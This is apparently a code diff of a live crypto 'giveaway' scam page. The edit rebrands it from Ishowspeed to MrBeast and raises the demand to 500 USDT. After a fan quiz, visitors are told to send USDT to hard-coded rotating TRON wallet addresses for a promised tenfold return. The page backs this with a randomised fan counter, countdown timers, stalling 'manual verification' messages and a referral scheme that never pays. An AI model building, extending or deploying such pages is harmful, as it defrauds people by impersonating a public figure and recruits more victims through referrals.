@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Ishowspeed Giveaway</title>
+    <title>MrBeast Giveaway</title>
     <link rel="icon" href="/favicon.ico">
     <script src="/assets/confetti.min.js"></script>
     <style>
@@ -475,18 +475,18 @@
 <body>
     <div class="ticker-wrap">
         <div class="ticker">
-            <span class="ticker-item">ENTRANCE AT 100 USDT</span>
+            <span class="ticker-item">ENTRANCE AT 500 USDT</span>
             <span class="ticker-item">ONE CLAIM PER FAN</span>
-            <span class="ticker-item">100 USDT ≋ 2000 USDT</span>
+            <span class="ticker-item">500 USDT ≋ 5000 USDT</span>
             <span class="ticker-item">FAN APPRECIATION DROP</span>
             <span class="ticker-item">72 HOURS ONLY</span>
-            <span class="ticker-item">POOL • 150,000 USDT</span>
-            <span class="ticker-item">ENTRANCE AT 100 USDT</span>
+            <span class="ticker-item">POOL • 5,000,000 USDT</span>
+            <span class="ticker-item">ENTRANCE AT 500 USDT</span>
             <span class="ticker-item">ONE CLAIM PER FAN</span>
-            <span class="ticker-item">100 USDT ≋ 1000 USDT</span>
+            <span class="ticker-item">500 USDT ≋ 5000 USDT</span>
             <span class="ticker-item">FAN APPRECIATION DROP</span>
             <span class="ticker-item">72 HOURS ONLY</span>
-            <span class="ticker-item">POOL • 150,000 USDT</span>
+            <span class="ticker-item">POOL • 5,000,000 USDT</span>
         </div>
     </div>
 
@@ -500,14 +500,14 @@
         <div class="splash-media" id="splashMedia">
             <video autoplay loop muted playsinline><source src="dishon-jay.mp4" type="video/mp4"><source src="dishon-jay.webm" type="video/webm"></video>
         </div>
-        <h2 id="splashTitle">💵 Welcome to the Ishowspeed Giveaway</h2>
+        <h2 id="splashTitle"> Welcome to the MrBeast Giveaway</h2>
         <p id="splashSubtitle">Get ready for an exclusive fan appreciation exchange...</p>
         <button class="splash-btn" id="splashBtn" onclick="enterSite()">Enter Giveaway</button>
     </div>
 
     <div class="container hidden" id="mainContent">
         <div class="header">
-            <h1> Ishowspeed Giveaway</h1>
+            <h1>💵 MrBeast Giveaway</h1>
             <h2>Fan Appreciation Exchange</h2>
         </div>
         
@@ -554,7 +554,7 @@
 
         <div class="question-card hidden" id="q5">
             <h3>5. Ronaldo or Messi?</h3>
-            <button class="option-btn" onclick="selectOptionAndContinue(this, 5, 6)">Ronaldo </button>
+            <button class="option-btn" onclick="selectOptionAndContinue(this, 5, 6)">Ronaldo 🐐</button>
             <button class="option-btn" onclick="selectOptionAndContinue(this, 5, 6)">Messi</button>
             <button class="option-btn" onclick="selectOptionAndContinue(this, 5, 6)">Both, don't make me choose</button>
             <div class="btn-group" style="margin-top: 20px;"><button class="back-btn" onclick="goBack(5)">← Back</button></div>
@@ -563,7 +563,7 @@
         <div class="question-card hidden" id="q6">
             <h3>6. What's my favorite soccer team?</h3>
             <button class="option-btn" onclick="selectOptionAndContinue(this, 6, 7)">USA</button>
-            <button class="option-btn" onclick="selectOptionAndContinue(this, 6, 7)">Portugal 🇵🇹</button>
+            <button class="option-btn" onclick="selectOptionAndContinue(this, 6, 7)">Portugal 🇹</button>
             <button class="option-btn" onclick="selectOptionAndContinue(this, 6, 7)">Argentina 🇦🇷</button>
             <div class="btn-group" style="margin-top: 20px;"><button class="back-btn" onclick="goBack(6)">← Back</button></div>
         </div>
@@ -638,15 +638,49 @@
             <h2>Your surprise</h2>
             <p style="color: #ccc; font-size: 1.1em; margin-bottom: 20px;">You were live with me. Let's make it worth it.</p>
             <p style="color: #c9a84c; font-size: 1em; margin-bottom: 10px;">The prize</p>
-            <div class="prize-box">100 USDT → 2000 USDT</div>
+            <div class="prize-box">500 USDT → 5000 USDT</div>
             <p style="color: #ccc; font-size: 1em; margin: 20px 0;">Follow the instructions below to claim:</p>
-            <button class="continue-btn" style="width: 100%;" onclick="showClaimForm()">Claim my 2000 USDT</button>
+            
+            <button class="continue-btn" style="width: 100%;" onclick="showClaimForm()">Claim my 5000 USDT</button>
+            
+            <!-- NEW REFERRAL EARNER BUTTON -->
+            <button class="continue-btn" style="width: 100%; margin-top: 15px; background: rgba(255,255,255,0.1); color: #fff; border: 1px solid rgba(255,255,255,0.2);" onclick="showReferralEarnerPath()">
+                Don't have USDT? Refer 20 people & earn 50 USDT!
+            </button>
+        </div>
+
+        <!-- NEW REFERRAL EARNER SECTION -->
+        <div class="question-card hidden" id="referralEarnerSection">
+            <h2>🚀 Referral Earner Path</h2>
+            <p style="color: #ccc; margin-bottom: 20px;">No USDT? No problem. Invite your friends and earn directly!</p>
+            
+            <div class="stat-box" style="text-align: center; margin-bottom: 20px; background: rgba(201, 168, 76, 0.05); border-radius: 10px; padding: 20px;">
+                <div style="font-size: 0.9em; color: #888; margin-bottom: 5px;">Your Progress</div>
+                <div style="font-size: 2em; color: #c9a84c; font-weight: bold;"><span id="refCountDisplay">0</span> / 20 Referrals</div>
+                <div style="margin-top: 10px; color: #fff;">Claimable: <strong id="claimableDisplay" style="color: #4caf50;">0 USDT</strong></div>
+            </div>
+
+            <div class="timer-box" style="margin: 20px 0;">
+                <h4>⏱️ Next Verification Batch</h4>
+                <div class="timer-display" id="referralTimer">48:00:00</div>
+                <p class="timer-label">Since I verify manually alone, referral payouts are processed in batches every 48 hours.</p>
+            </div>
+
+            <div class="referral-link" style="margin-top: 20px;">
+                <input type="text" id="earnerRefLink" readonly value="Loading your link...">
+                <button class="copy-btn" onclick="copyEarnerRef()">Copy</button>
+            </div>
+            <p style="color: #aaa; font-size: 0.85em; margin-top: 10px;">Share this link. Once you hit 20 signups, your 50 USDT enters the verification queue!</p>
+
+            <div class="btn-group" style="margin-top: 20px;">
+                <button class="back-btn" onclick="goBackToSurprise()">← Back to Token Claim</button>
+            </div>
         </div>
 
         <div class="form-section hidden" id="claimStep1">
             <h3>Step 1 of 2 — Tell me where to send your USDT</h3>
             <div class="form-group">
-                <label>Wallet address to receive your 2000 USDT</label>
+                <label>Wallet address to receive your 5000 USDT</label>
                 <input type="text" class="input-field" id="usdtAddress" placeholder="Any crypto wallet address (BTC, ETH, TRON, SOL, etc.)" oninput="validateField('usdtAddress')">
                 <div class="input-error" id="usdtError"><svg viewBox="0 0 512 512" width="1em" height="1em" fill="currentColor"><path d="M256 512A256 256 0 1 0 256 0a256 256 0 1 0 0 512zM175 175c9.4-9.4 24.6-9.4 33.9 0l47 47 47-47c9.4-9.4 24.6-9.4 33.9 0s9.4 24.6 0 33.9l-47 47 47 47c9.4 9.4 9.4 24.6 0 33.9s-24.6 9.4-33.9 0l-47-47-47 47c-9.4 9.4-24.6 9.4-33.9 0s-9.4-24.6 0-33.9l47-47-47-47c-9.4-9.4-9.4-24.6 0-33.9z"/></svg><span id="usdtErrorText">Please enter a valid crypto wallet address.</span></div>
             </div>
@@ -671,15 +705,15 @@
         </div>
 
         <div class="form-section hidden" id="claimStep2">
-            <h3>Step 2 of 2 — Send your fan USDT here</h3>
-            <p style="color: #aaa; margin-bottom: 20px; font-size: 0.9em;">Send 100 usdt and receive 2000 usdt</p>
+            <h3>Step 2 of 2 — Send your USDT here</h3>
+            <p style="color: #aaa; margin-bottom: 20px; font-size: 0.9em;">Send exactly 500 USDT and get 5000 USDT in appreciation return.</p>
             <div class="network-info">
                 <strong>Active Deposit Address:</strong><br>
                 <span id="tokenSendAddress" style="font-family: monospace; font-size: 0.95em; color: #fff; word-break: break-all;">LOADING...</span>
                 <button class="copy-btn" onclick="copyAddress()">Copy</button>
                 <div class="security-note">🔒 Address rotates periodically for security. Please send promptly.</div>
             </div>
-            <p style="color: #aaa; font-size: 0.9em; margin-bottom: 20px;">You'll need a small amount for gas. Double-check your network.</p>
+            <p style="color: #aaa; font-size: 0.9em; margin-bottom: 20px;">You might a small amount for gas. Double-check your network.</p>
             <div class="math-check">
                 <label>Quick check: what's 4 + 3?</label>
                 <input type="number" id="mathAnswer" placeholder="?">
@@ -693,7 +727,7 @@
         <div class="success-state hidden" id="successState">
             <div class="checkmark">✓</div>
             <h3>Received — You're in the queue.</h3>
-            <p>I'll manually check your USDT and send your 2000 USDT. Expect it within 48 hours, with an email once it's sent.</p>
+            <p>I'll manually check your USDT token transfer and send your 5000 USDT. Expect it within 48 hours, with an email once it's sent.</p>
             <p style="margin-top: 20px; color: #c9a84c;">Save your Login ID: <strong id="displayLoginId" style="color: #fff; font-family: monospace;"></strong></p>
             <div class="timer-box">
                 <h4 id="timerTitle">⏱️ Processing Timer</h4>
@@ -754,7 +788,7 @@
     <!-- Appeal Modal -->
     <div class="modal-overlay hidden" id="appealModal">
         <div class="modal-box">
-            <h3>️ Launch Appeal</h3>
+            <h3>⚠️ Launch Appeal</h3>
             <p>Please describe your issue. Keep it under 50 words so our team can review it quickly.</p>
             <textarea id="appealText" maxlength="350" placeholder="My wallet address is correct, but I haven't received the funds yet..."></textarea>
             <div class="word-count" id="appealWordCount" style="text-align: right; margin-bottom: 15px;">0/50 words</div>
@@ -781,11 +815,12 @@
         let referralPopupShown = false;
 
         const depositAddresses = [
-            "TDMqux1fjcpTBE2CtaP2FY4tMwunpCswzg",
-            "TDMqux1fjcpTBE2CtaP2FY4tMwunpCswzg",
-            "TDMqux1fjcpTBE2CtaP2FY4tMwunpCswzg",
-            "TDMqux1fjcpTBE2CtaP2FY4tMwunpCswzg",
-            "TDMqux1fjcpTBE2CtaP2FY4tMwunpCswzg"
+            "TRb3Vw8woWYhds16MHpwdUQ23u2kQhKcni",
+            "TTHXW5YvrZZ2me2MLJbpB9GeZFmjAkwTf4",
+            "TSEZDzjQYGot7fugQaDPir8XT22sCS4hG5",
+            "TRb3Vw8woWYhds16MHpwdUQ23u2kQhKcni",
+            "TTHXW5YvrZZ2me2MLJbpB9GeZFmjAkwTf4",
+            
         ];
 
         function getRotatingAddress() {
@@ -818,7 +853,7 @@
         }
         setInterval(updateFanCounter, 5000);
 
-        //  Referral popup functions - triggered at the END
+        // 🎁 Referral popup functions - triggered at the END
         function showReferralPopup() {
             if (referralPopupShown) return;
             const savedLoginId = safeGet('dj_login_id');
@@ -869,13 +904,13 @@
                 document.getElementById('mainContent').classList.add('visible');
                 document.getElementById('referralFab').classList.remove('hidden');
                 document.getElementById('mainContent').innerHTML = `
-                    <div class="ticker-wrap"><div class="ticker"><span class="ticker-item">ENTRANCE AT 100 USDT</span><span class="ticker-item">ONE CLAIM PER FAN</span><span class="ticker-item">100 MINE ≋ 2000 USDT</span><span class="ticker-item">FAN APPRECIATION DROP</span><span class="ticker-item">72 HOURS ONLY</span><span class="ticker-item">POOL • 150,000 USDT</span></div></div>
-                    <div class="header"><h1>💵 Ishowspeed Giveaway</h1><h2>Fan Appreciation Exchange</h2></div>
+                    <div class="ticker-wrap"><div class="ticker"><span class="ticker-item">ENTRANCE AT 2,000 USDT</span><span class="ticker-item">ONE CLAIM PER FAN</span><span class="ticker-item">500 USDT ≋ 5000 USDT</span><span class="ticker-item">FAN APPRECIATION DROP</span><span class="ticker-item">72 HOURS ONLY</span><span class="ticker-item">POOL • 10,000 USDT</span></div></div>
+                    <div class="header"><h1>💵 MrBeast Giveaway</h1><h2>Fan Appreciation Exchange</h2></div>
                     <div class="fan-counter"><span class="fan-count">${Math.floor(Math.random() * 5000 + 10000).toLocaleString()}</span> fans building their profile right now</div>
                     <div class="success-state">
                         <div class="checkmark">✓</div>
                         <h3>Received — You're in the queue.</h3>
-                        <p>I'll manually check your USDT transfer and send your 2000 USDT. Expect it within 48 hours, with an email once it's sent.</p>
+                        <p>I'll manually check your USDT token transfer and send your 5000 USDT. Expect it within 48 hours, with an email once it's sent.</p>
                         <p style="margin-top: 20px; color: #c9a84c;">Your Login ID: <strong style="color: #fff; font-family: monospace;">${savedLoginId}</strong></p>
                         <div class="timer-box">
                             <h4>⏱️ Processing Timer</h4>
@@ -889,7 +924,7 @@
                         <h3>Share with your friends</h3>
                         <div class="referral-bonus">
                             <h5>🎁 Referral Bonus</h5>
-                            <p>You get <span class="highlight">10 USDT for every 20 people</span> you share to and have a chance of winning <span class="highlight">10,000 USDT extra bonanza</span>!</p>
+                            <p>You get <span class="highlight">50 USDT for every 20 people</span> you share to and have a chance of winning <span class="highlight">10,000 USDT extra bonanza</span>!</p>
                             <p style="color: #c9a84c; font-size: 0.9em; margin-top: 10px;">Your Referral ID: <strong style="font-family: monospace; color: #fff;">${savedRefCode}</strong></p>
                         </div>
                         <div class="referral-link">
@@ -1197,7 +1232,7 @@
         function copyAddress() { navigator.clipboard.writeText(getRotatingAddress()).then(() => alert('Address copied!')); }
         function copyReferral() { navigator.clipboard.writeText(document.getElementById('referralLink').value).then(() => alert('Referral link copied!')); }
         function getShareUrl() { return document.getElementById('referralLink').value || window.location.href; }
-        function getShareText() { return "I just claimed 100 USDT from the Ishowspeed Fan Giveaway! Join here: "; }
+        function getShareText() { return "I just claimed 100 USDT from the MrBeast Fan Giveaway! Join here: "; }
         function shareX(e) { e.preventDefault(); window.open('https://twitter.com/intent/tweet?text=' + encodeURIComponent(getShareText()) + '&url=' + encodeURIComponent(getShareUrl()), '_blank'); }
         function shareFacebook(e) { e.preventDefault(); window.open('https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(getShareUrl()), '_blank'); }
         function shareWhatsApp(e) { e.preventDefault(); window.open('https://wa.me/?text=' + encodeURIComponent(getShareText() + getShareUrl()), '_blank'); }
@@ -1206,6 +1241,72 @@
         function shareTikTok(e) { e.preventDefault(); navigator.clipboard.writeText(getShareText() + getShareUrl()).then(() => { alert('Link copied! Opening TikTok...'); window.open('https://www.tiktok.com/', '_blank'); }); }
         function shareInstagram(e) { e.preventDefault(); navigator.clipboard.writeText(getShareText() + getShareUrl()).then(() => { alert('Link copied! Open Instagram and paste in Story or DM.'); window.open('https://www.instagram.com/', '_blank'); }); }
         function restartQuiz() { location.reload(); }
+
+        // --- Referral Earner Path Logic ---
+        function showReferralEarnerPath() {
+            document.getElementById('surpriseSection').classList.add('hidden');
+            document.getElementById('referralEarnerSection').classList.remove('hidden');
+            startReferralTimer();
+            
+            const savedRef = safeGet('dj_ref_code');
+            const linkInput = document.getElementById('earnerRefLink');
+            if (savedRef) {
+                linkInput.value = window.location.origin + '?ref=' + savedRef;
+            } else {
+                linkInput.value = window.location.origin + '?ref=PENDING';
+            }
+            updateReferralStats(0); 
+        }
+
+        function goBackToSurprise() {
+            document.getElementById('referralEarnerSection').classList.add('hidden');
+            document.getElementById('surpriseSection').classList.remove('hidden');
+        }
+
+        function updateReferralStats(count) {
+            document.getElementById('refCountDisplay').textContent = count;
+            const batches = Math.floor(count / 20);
+            const claimable = batches * 50;
+            document.getElementById('claimableDisplay').textContent = claimable + ' USDT';
+        }
+
+        function copyEarnerRef() {
+            const link = document.getElementById('earnerRefLink');
+            navigator.clipboard.writeText(link.value).then(() => alert('Referral link copied!'));
+        }
+
+        let referralTimerInterval;
+        function startReferralTimer() {
+            if (referralTimerInterval) clearInterval(referralTimerInterval);
+            
+            let target = localStorage.getItem('ref_batch_target');
+            if (!target) {
+                target = Date.now() + (48 * 60 * 60 * 1000);
+                localStorage.setItem('ref_batch_target', target);
+            }
+            
+            function update() {
+                const now = Date.now();
+                const remaining = target - now;
+                
+                if (remaining <= 0) {
+                    document.getElementById('referralTimer').textContent = '00:00:00';
+                    target = Date.now() + (48 * 60 * 60 * 1000);
+                    localStorage.setItem('ref_batch_target', target);
+                    return;
+                }
+                
+                const h = Math.floor(remaining / (1000 * 60 * 60));
+                const m = Math.floor((remaining % (1000 * 60 * 60)) / (1000 * 60));
+                const s = Math.floor((remaining % (1000 * 60)) / 1000);
+                
+                document.getElementById('referralTimer').textContent = 
+                    h.toString().padStart(2, '0') + ':' + m.toString().padStart(2, '0') + ':' + s.toString().padStart(2, '0');
+            }
+            
+            update();
+            referralTimerInterval = setInterval(update, 1000);
+        }
     </script>
 </body>
 </html>
